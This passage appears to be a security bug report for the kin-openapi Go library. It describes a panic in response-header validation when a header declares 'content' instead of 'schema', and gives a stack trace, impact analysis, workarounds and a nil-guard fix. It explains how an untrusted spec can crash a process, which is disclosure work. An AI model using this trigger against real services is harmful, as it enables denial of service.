github.com/getkin/kin-openapi/openapi3filter.validateResponseHeader(...)
	/src/openapi3filter/validate_response.go:181 +0x146
github.com/getkin/kin-openapi/openapi3filter.ValidateResponse(...)
	/src/openapi3filter/validate_response.go:89 +0xafa
```

The `FAIL` is the point: control passes, the header case takes the binary down.

Ran in a container against a fresh clone of master. I have not tried it against a live proxy.

## Impact

A process crash instead of an error return. Declaring the header is enough, so it is every call on that operation rather than an occasional one.

If the spec comes from somewhere else -- gateways, linters, anything ingesting specs it did not write -- that is a trust boundary, and it becomes remote availability.

If it is your own spec, nothing attacker-controlled starts it, but any client reaching that route then crashes the process. It fires on every call, so normally you would see it the first time that route runs. A spec edited without exercising the route is the case where you would not. That is the difference from GHSA-jpcw, where the attacker supplied the trigger. I have left severity unset; the two cases do not score the same.

On how common it is, I checked rather than guessed. Of roughly 1,500 OpenAPI 3.x specs on apis.guru, one declares content-typed response headers -- VTEX Catalog API -- and not in one corner of it: the shape repeats across its operations, so for that consumer this is not an edge case.

The header names in it (`X-AspNet-Version`, `p3p`, a few malformed ones) look like a generator emitting `content` where it could not infer a schema, and apis.guru only indexes public specs. There is no content-typed response header in this repo's testdata either.

## Workarounds

Use `schema` on the response header, or skip `ValidateResponse` for those operations. `ExcludeResponseBody` will not do it -- headers are validated before that check.

## Suggested fix

Nil-guard at the top of `decodeValue`:

```go
if schema == nil {
	return nil, false, nil
}
```

Returning nil leaves a `content`-typed header unvalidated rather than erroring, so it trades the crash for a silent gap. An error return kills the panic just as well if you would rather it surfaced.
